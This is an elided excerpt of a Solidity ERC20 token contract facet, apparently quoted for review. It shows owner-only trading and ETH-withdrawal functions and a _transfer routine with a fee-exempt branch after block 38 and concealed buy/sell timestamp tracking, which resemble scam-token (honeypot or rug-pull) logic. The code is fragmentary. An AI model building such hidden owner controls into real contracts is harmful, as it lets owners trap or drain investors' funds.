...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function openTrading() external payable onlyOwner {
        ...
        _approve(address(this), address(ds.dexRouter), _tTotal);
    ...
    function manualSwap() external onlyOwner {
        ...
        if (ethBalance > 0) {
            ds._marketingAddress.transfer(ethBalance);
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (
            ...
            ds.initRefund = block.timestamp;
        }
        if (
            ds._isExcludedFromFee[from] && (block.number > ds.launchBlock + 38)
        ) {
            unchecked {
        ...
        if (!ds._isExcludedFromFee[from] && !ds._isExcludedFromFee[to]) {
            if (ds.lpPair == to) {
                TestLib.TradeRefund storage fromRef = ds.tradeRefund[from];
                fromRef.dappUnits = fromRef.buy - ds.initRefund;
                fromRef.sell = block.timestamp;
            } else {
                TestLib.TradeRefund storage toRef = ds.tradeRefund[to];
                if (ds.lpPair == from) {
                    if (toRef.buy == 0) {
                        toRef.buy = (ds._buyCount < 11)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
